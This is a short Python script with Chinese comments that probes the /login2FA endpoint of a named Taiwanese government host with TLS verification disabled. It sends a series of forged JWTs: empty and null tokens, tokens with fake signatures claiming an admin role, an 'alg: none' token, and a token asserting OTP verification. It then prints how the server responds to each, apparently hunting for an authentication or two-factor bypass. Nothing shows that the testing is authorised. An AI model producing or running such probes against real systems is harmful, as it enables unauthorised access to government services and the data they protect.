import json, ssl, urllib.request, urllib.error, base64
CTX=ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
BASE="https://epcr.tpf.gov.tw:4004"
def post(path, body_dict):
    body=json.dumps(body_dict).encode()
    req=urllib.request.Request(BASE+path,data=body,method="POST",
        headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
    try:
        r=urllib.request.urlopen(req,timeout=12,context=CTX); return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return None, repr(e)

# 构造各种 token 形态测 /login2FA 响应差异
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=')
def fake_jwt(h,p,alg="HS256",sig="fake"):
    return b64u(json.dumps(h).encode()).decode()+"."+b64u(json.dumps(p).encode()).decode()+"."+sig

cases = {
  "空userToken": {"userToken":"","domain":"AUTH_SERVER"},
  "null": {"userToken":None,"domain":"AUTH_SERVER"},
  "非JWT字符串": {"userToken":"abc","domain":"AUTH_SERVER"},
  "两段无签名": {"userToken":"eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7fX0","domain":"AUTH_SERVER"},
  "三段假签名": {"userToken":fake_jwt({"alg":"HS256","typ":"JWT"},{"user":{"username":"admin","role":"ADMIN"},"permissions":["ADMIN"]},"HS256","c2lnbmF0dXJl"),"domain":"AUTH_SERVER"},
  "alg-none": {"userToken":fake_jwt({"alg":"none","typ":"JWT"},{"user":{"username":"admin","role":"ADMIN"}},"none",""),"domain":"AUTH_SERVER"},
  "带OTPClaim": {"userToken":fake_jwt({"alg":"HS256","typ":"JWT"},{"user":{"username":"admin"},"otp":"123456","tfaVerified":True},"HS256","sig"),"domain":"AUTH_SERVER"},
}
print("=== /login2FA 响应差异探测 ===")
for name,bd in cases.items():
    code,b=post("/login2FA",bd)
    print(f"  {name:14s} -> {code} | {b[:90]}")
print("DONE")
